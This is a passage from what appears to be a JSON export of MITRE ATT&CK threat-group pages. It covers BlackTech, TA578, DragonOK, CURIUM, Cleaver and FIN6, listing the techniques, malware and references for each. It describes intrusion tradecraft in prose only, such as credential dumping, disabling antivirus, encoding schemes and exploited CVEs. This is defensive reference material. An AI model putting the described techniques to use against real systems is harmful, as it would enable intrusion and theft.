API BlackTech has used built-in API functions.[4] Enterprise T1046 Network Service Discovery BlackTech has used the SNScan tool to find other potential targets on victim networks.[2] Enterprise T1588 .002 Obtain Capabilities: Tool BlackTech has obtained and used tools such as Putty, SNScan, and PsExec for its operations.[2] .003 Obtain Capabilities: Code Signing Certificates BlackTech has used stolen code-signing certificates for its malicious payloads.[2] .004 Obtain Capabilities: Digital Certificates BlackTech has used valid, stolen digital certificates for some of their malware and tools.[6] Enterprise T1566 .001 Phishing: Spearphishing Attachment BlackTech has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware.[1][7] .002 Phishing: Spearphishing Link BlackTech has used spearphishing e-mails with links to cloud services to deliver malware.[1] Enterprise T1021 .004 Remote Services: SSH BlackTech has used Putty for remote access.[2] Enterprise T1204 .001 User Execution: Malicious Link BlackTech has used e-mails with malicious links to lure victims into installing malware.[1] .002 User Execution: Malicious File BlackTech has used e-mails with malicious documents to lure victims into installing malware.[1][7] Software ID Name References Techniques S0696 Flagpro [7] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Exfiltration Over C2 Channel, Indicator Removal, Ingress Tool Transfer, Masquerading, Native API, Network Share Discovery, Obfuscated Files or Information, Permission Groups Discovery: Local Groups, Phishing: Spearphishing Attachment, Process Discovery, Remote System Discovery, Scheduled Transfer, System Location Discovery: System Language Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, User Execution: Malicious File S0437 Kivars [1][2] File and Directory Discovery, Hide Artifacts: Hidden Window, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Remote Services, Screen Capture S0435 PLEAD [1][8][5][2] Application Layer Protocol: Web Protocols, Application Window Discovery, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Data Obfuscation: Junk Data, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Process Discovery, Proxy, User Execution: Malicious File, User Execution: Malicious Link S0029 PsExec [2] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0436 TSCookie [9] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Ingress Tool Transfer, Non-Application Layer Protocol, Process Discovery, Process Injection, Proxy, System Network Configuration Discovery, User Execution: Malicious Link S0579 Waterbear [5] Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, Impair Defenses: Indicator Blocking, Ingress Tool Transfer, Modify Registry, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Indicator Removal from Tools, Process Discovery, Process Injection: Thread Execution Hijacking, Process Injection, Query Registry, Software Discovery: Security Software Discovery, System Network Connections Discovery References Bermejo, L., et al. (2017, June 22). Following the Trail of BlackTech\u2019s Cyber Espionage Campaigns. Retrieved May 5, 2020. Threat Intelligence. (2020, September 29). Palmerworm: Espionage Gang Targets the Media, Finance, and Other Sectors. Retrieved March 25, 2022. Lee, Y. (2020, August 19). Taiwan says China behind cyberattacks on government agencies, emails. Retrieved April 6, 2022. Demboski, M., et al. (2021, October 26). China cyber attacks: the current threat landscape. Retrieved March 25, 2022. Su, V. et al. (2019, December 11). Waterbear Returns, Uses API Hooking to Evade Security. Retrieved February 22, 2021. Cherepanov, A.. (2018, July 9). Certificates stolen from Taiwanese tech\u2011companies misused in Plead malware campaign. Retrieved May 6, 2020. Hada, H. (2021, December 28). Flagpro The new malware used by BlackTech. Retrieved March 25, 2022. Tomonaga, S. (2018, June 8). PLEAD Downloader Used by BlackTech. Retrieved May 6, 2020. Tomonaga, S. (2018, March 6). Malware \u201cTSCookie\u201d. Retrieved May 6, 2020. "
},
{
"id": 161,
"title": "TA578, Group G1038",
"path": "/groups/G1038/index.html",
"content": " TA578 TA578 is a threat actor that has used contact forms and email to initiate communications with victims and to distribute malware including Latrodectus, IcedID, and Bumblebee.[1][2] ID: G1038 Version: 1.0 Created: 17 September 2024 Last Modified: 17 September 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .006 Acquire Infrastructure: Web Services TA578 has used Google Firebase to host malicious scripts.[1] Enterprise T1059 .007 Command and Scripting Interpreter: JavaScript TA578 has used JavaScript files in malware execution chains.[1] Enterprise T1594 Search Victim-Owned Websites TA578 has filled out contact forms on victims' websites to direct them to adversary-controlled URLs.[1] Enterprise T1204 .001 User Execution: Malicious Link TA578 has placed malicious links in contact forms on victim sites, often spoofing a copyright complaint, to redirect users to malicious file downloads.[1] Software ID Name References Techniques S1039 Bumblebee [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Archive Collected Data, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data from Local System, Debugger Evasion, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Fallback Channels, Indicator Removal: File Deletion, Ingress Tool Transfer, Inter-Process Communication: Component Object Model, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Asynchronous Procedure Call, Process Injection, Query Registry, Scheduled Task/Job: Scheduled Task, Shared Modules, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Odbcconf, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion, Web Service, Windows Management Instrumentation S0483 IcedID [1] Account Discovery: Domain Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Command and Scripting Interpreter: Visual Basic, Domain Trust Discovery, Drive-by Compromise, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Network Share Discovery, Obfuscated Files or Information: Embedded Payloads, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Steganography, Obfuscated Files or Information: Software Packing, Permission Groups Discovery, Phishing: Spearphishing Attachment, Process Injection: Process Hollowing, Process Injection: Asynchronous Procedure Call, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Information Discovery, System Location Discovery: System Language Discovery, System Network Configuration Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion, Windows Management Instrumentation S1160 Latrodectus [1][2] Account Discovery: Domain Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: JavaScript, Data Encoding: Standard Encoding, Data from Local System, Debugger Evasion, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: NTFS File Attributes, Indicator Removal: File Deletion, Ingress Tool Transfer, Inter-Process Communication: Component Object Model, Masquerading: Match Legitimate Resource Name or Location, Multi-Stage Channels, Native API, Network Share Discovery, Obfuscated Files or Information: Dynamic API Resolution, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Encrypted/Encoded File, Permission Groups Discovery: Domain Groups, Phishing: Spearphishing Attachment, Phishing: Spearphishing Link, Process Discovery, Remote Services: VNC, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Binary Proxy Execution: Msiexec, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Shutdown/Reboot, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Web Service, Windows Management Instrumentation References Proofpoint Threat Research and Team Cymru S2 Threat Research. (2024, April 4). Latrodectus: This Spider Bytes Like Ice . Retrieved May 31, 2024. Batista, J. (2024, June 17). Latrodectus, are you coming back?. Retrieved September 13, 2024. "
},
{
"id": 162,
"title": "DragonOK, Group G0017",
"path": "/groups/G0017/index.html",
"content": " DragonOK DragonOK is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, DragonOK is thought to have a direct or indirect relationship with the threat group Moafee. [1] It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT. [2] ID: G0017 Version: 1.0 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Software ID Name References Techniques S0013 PlugX [2] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0012 PoisonIvy [1] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit References Haq, T., Moran, N., Vashisht, S., Scott, M. (2014, September). OPERATION QUANTUM ENTANGLEMENT. Retrieved November 17, 2024. Miller-Osborn, J., Grunzweig, J.. (2015, April). Unit 42 Identifies New DragonOK Backdoor Malware Deployed Against Japanese Targets. Retrieved November 4, 2015. "
},
{
"id": 163,
"title": "CURIUM, Crimson Sandstorm, TA456, Tortoise Shell, Yellow Liderc, Group G1012",
"path": "/groups/G1012/index.html",
"content": " CURIUM CURIUM is an Iranian threat group, first reported in September 2019 and active since at least July 2018, targeting IT service providers in the Middle East.[1] CURIUM has since invested in building relationships with potential targets via social media over a period of months to establish trust and confidence before sending malware. Security researchers note CURIUM has demonstrated great patience and persistence by chatting with potential targets daily and sending benign files to help lower their security consciousness.[2] ID: G1012 \u24d8 Associated Groups: Crimson Sandstorm, TA456, Tortoise Shell, Yellow Liderc Contributors: Denise Tan; Wirapong Petshagun Version: 3.0 Created: 13 January 2023 Last Modified: 02 October 2024 Version Permalink Live Version Associated Group Descriptions Name Description Crimson Sandstorm [3] TA456 [3][4] Tortoise Shell [3] Yellow Liderc [5] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains CURIUM created domains to facilitate strategic website compromise and credential capture activities.[5] .003 Acquire Infrastructure: Virtual Private Server CURIUM created virtual private server instances to facilitate use of malicious domains and other items.[5] .004 Acquire Infrastructure: Server CURIUM has created dedicated servers for command and control and exfiltration purposes.[5] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell CURIUM has leveraged PowerShell scripts for initial process execution and data gathering in victim environments.[1] Enterprise T1584 .006 Compromise Infrastructure: Web Services CURIUM has compromised legitimate websites to enable strategic website compromise attacks.[5] Enterprise T1005 Data from Local System CURIUM has exfiltrated data from a compromised machine.[2] Enterprise T1189 Drive-by Compromise CURIUM has used strategic website compromise to infect victims with malware such as IMAPLoader.[5] Enterprise T1585 .001 Establish Accounts: Social Media Accounts CURIUM has established a network of fictitious social media accounts, including on Facebook and LinkedIn, to establish relationships with victims, often posing as an attractive woman.[2] .002 Establish Accounts: Email Accounts CURIUM has created dedicated email accounts for use with tools such as IMAPLoader.[5] Enterprise T1048 .002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol CURIUM has used SMTPS to exfiltrate collected data from victims.[5] Enterprise T1041 Exfiltration Over C2 Channel CURIUM has used IMAP and SMTPS for exfiltration via tools such as IMAPLoader.[5] Enterprise T1566 .001 Phishing: Spearphishing Attachment CURIUM has used phishing with malicious attachments for initial access to victim environments.[5] .003 Phishing: Spearphishing via Service CURIUM has used social media to deliver malicious files to victims.[2] Enterprise T1598 .003 Phishing for Information: Spearphishing Link CURIUM used malicious links to adversary-controlled resources for credential harvesting.[5] Enterprise T1505 .003 Server Software Component: Web Shell CURIUM has been linked to web shells following likely server compromise as an initial access vector into victim networks.[1] Enterprise T1608 .004 Stage Capabilities: Drive-by Target CURIUM used strategic website compromise to fingerprint then target victims.[5] Enterprise T1082 System Information Discovery CURIUM deploys information gathering tools focused on capturing IP configuration, running application, system information, and network connectivity information.[1] Enterprise T1124 System Time Discovery CURIUM deployed mechanisms to check system time information following strategic website compromise attacks.[5] Enterprise T1204 .002 User Execution: Malicious File CURIUM has lured users into opening malicious files delivered via social media.[2] Software ID Name References Techniques S1152 IMAPLoader IMAPLoader was deployed by CURIUM as a post-exploitation payload from strategic website compromise.[5] Application Layer Protocol: Mail Protocols, Create or Modify System Process, Hide Artifacts: Hidden Window, Hijack Execution Flow: AppDomainManager, Ingress Tool Transfer, Native API, Scheduled Task/Job: Scheduled Task, System Information Discovery, Windows Management Instrumentation References Symantec Threat Hunter Team. (2019, September 18). Tortoiseshell Group Targets IT Providers in Saudi Arabia in Probable Supply Chain Attacks. Retrieved May 20, 2024. MSTIC. (2021, November 16). Evolving trends in Iranian threat actor activity \u2013 MSTIC presentation at CyberWarCon 2021. Retrieved January 12, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Miller, J. et. al. (2021, July 28). I Knew You Were Trouble: TA456 Targets Defense Contractor with Alluring Social Media Persona. Retrieved March 11, 2024. PwC Threat Intelligence. (2023, October 25). Yellow Liderc ships its scripts and delivers IMAPLoader malware. Retrieved August 14, 2024. "
},
{
"id": 164,
"title": "Cleaver, Threat Group 2889, TG-2889, Group G0003",
"path": "/groups/G0003/index.html",
"content": " Cleaver Cleaver is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver. [1] Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889). [2] ID: G0003 \u24d8 Associated Groups: Threat Group 2889, TG-2889 Version: 1.3 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Threat Group 2889 [2] TG-2889 [2] Techniques Used Domain ID Name Use Enterprise T1557 .002 Adversary-in-the-Middle: ARP Cache Poisoning Cleaver has used custom tools to facilitate ARP cache poisoning.[1] Enterprise T1587 .001 Develop Capabilities: Malware Cleaver has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.[1] Enterprise T1585 .001 Establish Accounts: Social Media Accounts Cleaver has created fake LinkedIn profiles that included profile photos, details, and connections.[2] Enterprise T1588 .002 Obtain Capabilities: Tool Cleaver has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor.[1] Software ID Name References Techniques S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0056 Net Crawler [1] Brute Force: Password Cracking, OS Credential Dumping: LSASS Memory, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0004 TinyZBot [1] Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Impair Defenses: Disable or Modify Tools, Input Capture: Keylogging, Screen Capture References Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017. Dell SecureWorks. (2015, October 7). Suspected Iran-Based Hacker Group Creates Network of Fake LinkedIn Profiles. Retrieved January 14, 2016. "
},
{
"id": 165,
"title": "FIN6, Magecart Group 6, ITG08, Skeleton Spider, TAAL, Camouflage Tempest, Group G0037",
"path": "/groups/G0037/index.html",
"content": " FIN6 FIN6 is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors.[1][2] ID: G0037 \u24d8 Associated Groups: Magecart Group 6, ITG08, Skeleton Spider, TAAL, Camouflage Tempest Contributors: Center for Threat-Informed Defense (CTID); Drew Church, Splunk Version: 4.0 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Magecart Group 6 [3] ITG08 [4] Skeleton Spider [5] TAAL [6] Camouflage Tempest [6] Techniques Used Domain ID Name Use Enterprise T1134 Access Token Manipulation FIN6 has used has used Metasploit\u2019s named-pipe impersonation technique to escalate privileges.[2] Enterprise T1087 .002 Account Discovery: Domain Account FIN6 has used Metasploit\u2019s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.[1] Enterprise T1560 Archive Collected Data Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration.[1] .003 Archive via Custom Method FIN6 has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation.[1][7] Enterprise T1119 Automated Collection FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.[1][7] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.[1] Enterprise T1110 .002 Brute Force: Password Cracking FIN6 has extracted password hashes from ntds.dit to crack offline.[1] Enterprise T1059 Command and Scripting Interpreter FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[1][2] .001 PowerShell FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.[1][2][8] .003 Windows Command Shell FIN6 has used kill.bat script to disable security tools.[2] .007 JavaScript FIN6 has used malicious JavaScript to steal payment card data from e-commerce sites.[7] Enterprise T1555 Credentials from Password Stores FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.[8] .003 Credentials from Web Browsers FIN6 has used the Stealer One credential stealer to target web browsers.[8] Enterprise T1213 Data from Information Repositories FIN6 has collected schemas and user accounts from systems running SQL Server.[8] Enterprise T1005 Data from Local System FIN6 has collected and exfiltrated payment card data from compromised systems.[7][9][10] Enterprise T1074 .002 Data Staged: Remote Data Staging FIN6 actors have compressed data from remote systems and moved it to another staging system before exfiltration.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.[1] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol FIN6 has sent stolen payment card data to remote servers via HTTP POSTs.[7] Enterprise T1068 Exploitation for Privilege Escalation FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools FIN6 has deployed a utility script named kill.bat to disable anti-virus.[2] Enterprise T1070 .004 Indicator Removal: File Deletion FIN6 has removed files from victim machines.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service FIN6 has renamed the \"psexec\" service name to \"mstdc\" to masquerade as a legitimate Windows service.[2] Enterprise T1046 Network Service Discovery FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[1] Enterprise T1095 Non-Application Layer Protocol FIN6 has used Metasploit Bind and Reverse TCP stagers.[7] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation FIN6 has used encoded PowerShell commands.[8] Enterprise T1588 .002 Obtain Capabilities: Tool FIN6 has obtained and used tools such as Mimikatz, Cobalt Strike, and AdFind.[4][2] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory FIN6 has used Windows Credential Editor for credential dumping.[1][2] .003 OS Credential Dumping: NTDS FIN6 has used Metasploit\u2019s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.[1][2] Enterprise T1566 .001 Phishing: Spearphishing Attachment FIN6 has targeted victims with e-mails containing malicious attachments.[8] .003 Phishing: Spearphishing via Service FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets.[4] Enterprise T1572 Protocol Tunneling FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol FIN6 used RDP to move laterally in victim networks.[1][2] Enterprise T1018 Remote System Discovery FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing FIN6 has used Comodo code-signing certificates.[4] Enterprise T1569 .002 System Services: Service Execution FIN6 has created Windows services to execute encoded PowerShell commands.[2] Enterprise T1204 .002 User Execution: Malicious File FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts.[8] Enterprise T1078 Valid Accounts To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.[1][2][8] Enterprise T1102 Web Service FIN6 has used Pastebin and Google Storage to host content for their operations.[2] Enterprise T1047 Windows Management Instrumentation FIN6 has used WMI to automate the remote execution of PowerShell scripts.[4] Software ID Name References Techniques S0552 AdFind [2] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0154 Cobalt Strike [2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0381 FlawedAmmyy [8] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data from Local System, Data Obfuscation, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture, Peripheral Device Discovery, Permission Groups Discovery: Local Groups, Screen Capture, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Binary Proxy Execution: Msiexec, System Information Discovery, System Owner/User Discovery, Windows Management Instrumentation S0503 FrameworkPOS [11][5][8] Archive Collected Data: Archive via Custom Method, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over Alternative Protocol, Process Discovery S0632 GrimAgent [12] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Junk Data, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Binary Padding, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Location Discovery: System Language Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: Time Based Evasion S0372 LockerGoga [2] Account Access Removal, Data Encrypted for Impact, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Lateral Tool Transfer, Loss of Control, Loss of Productivity and Revenue, Loss of View, Subvert Trust Controls: Code Signing, System Shutdown/Reboot S0449 Maze [13] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, Dynamic Resolution, Hide Artifacts: Run Virtual Instance, Impair Defenses: Disable or Modify Tools, Indicator Removal, Inhibit System Recovery, Masquerading: Masquerade Task or Service, Native API, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information, Process Discovery, Process Injection: Dynamic-link Library Injection, Scheduled Task/Job: Scheduled Task, Service Stop, System Binary Proxy Execution: Msiexec, System Information Discovery, System Location Discovery: System Language Discovery, System Network Connections Discovery, System Shutdown/Reboot, Windows Management Instrumentation S0002 Mimikatz [4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0284 More_eggs [4][8] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Owner/User Discovery S0029 PsExec [1][2] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0446 Ryuk [2] Access Token Manipulation, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, File and Directory Discovery, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Impair Defenses: Disable or Modify Tools, Inhibit System Recovery, Loss of Productivity and 